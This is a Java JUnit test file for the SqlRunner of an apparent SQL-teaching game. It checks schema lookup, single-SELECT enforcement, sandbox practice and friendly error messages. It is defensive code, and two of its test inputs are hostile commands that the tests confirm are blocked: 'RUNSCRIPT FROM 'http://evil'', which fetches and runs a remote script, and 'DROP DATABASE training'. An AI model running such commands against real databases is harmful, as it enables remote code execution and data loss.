package com.plupp.sqlgame.core;

import com.plupp.sqlgame.model.LevelDefinition;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

class SqlRunnerTest {

    @Test
    void returnsSchemaMetadataForLevel() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        List<Map<String, Object>> schema = runner.schemaForLevel(level);

        assertFalse(schema.isEmpty());
        Map<String, Object> customers = schema.stream().filter(t -> "CUSTOMERS".equals(t.get("name"))).findFirst().orElseThrow();
        List<Map<String, String>> columns = (List<Map<String, String>>) customers.get("columns");
        assertEquals(List.of("ID", "NAME", "CITY"), columns.stream().map(c -> c.get("name")).toList());
    }

    @Test
    void allowsSingleSelectStatementForLevelRun() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        var result = runner.runForLevel(level, "SELECT name FROM customers ORDER BY name;");

        assertNull(result.error);
        assertEquals(List.of("NAME"), result.columns);
        assertFalse(result.rows.isEmpty());
    }

    @Test
    void commandAllowlistBlocksNonSelect() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        var result = runner.runForLevel(level, "DELETE FROM customers;");

        assertEquals("This level only allows: SELECT", result.error);
    }

    @Test
    void levelModeBlocksMultipleStatements() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        var result = runner.runForLevel(level, "SELECT name FROM customers; SELECT city FROM customers;");

        assertEquals("Please run exactly one SQL statement at a time.", result.error);
    }

    @Test
    void sandboxAllowsDdlAndDmlForFreePractice() {
        SqlRunner runner = new SqlRunner();

        assertNull(runner.runSandbox("CREATE TABLE tmp(id INT, name VARCHAR(20));").error);
        assertNull(runner.runSandbox("INSERT INTO tmp(id, name) VALUES (1, 'Ada');").error);
        var select = runner.runSandbox("SELECT name FROM tmp;");

        assertNull(select.error);
        assertEquals(List.of("NAME"), select.columns);
        assertEquals(List.of(List.of("Ada")), select.rows);
    }

    @Test
    void forbiddenCommandsAreBlockedInSandbox() {
        SqlRunner runner = new SqlRunner();

        var result = runner.runSandbox("RUNSCRIPT FROM 'http://evil';");

        assertEquals("That command is blocked in sandbox mode for safety.", result.error);
    }

    @Test
    void forbiddenCommandsAreBlockedInLevelMode() {
        LevelRepository repo = new LevelRepository();
        SqlRunner runner = new SqlRunner();
        LevelDefinition level = repo.byId("level-1").orElseThrow();
        runner.reset(level);

        var result = runner.runForLevel(level, "DROP DATABASE training;");

        assertEquals("That command is blocked in learning mode for safety.", result.error);
    }

    @Test
    void returnsFriendlyFeedbackForCommonSqlMistakes() {
        SqlRunner runner = new SqlRunner();

        var tableError = runner.runSandbox("SELECT * FROM does_not_exist;");
        assertEquals("Table not found. Did you use the correct table name/alias?", tableError.error);

        var syntaxError = runner.runSandbox("SELECT FROM");
        assertEquals("Syntax issue detected. Check commas, aliases, and clause order.", syntaxError.error);

        runner.runSandbox("CREATE TABLE known_table(id INT);");
        var columnError = runner.runSandbox("SELECT name FROM known_table;");
        assertEquals("Column not found. Open the schema panel and verify names.", columnError.error);
    }
}
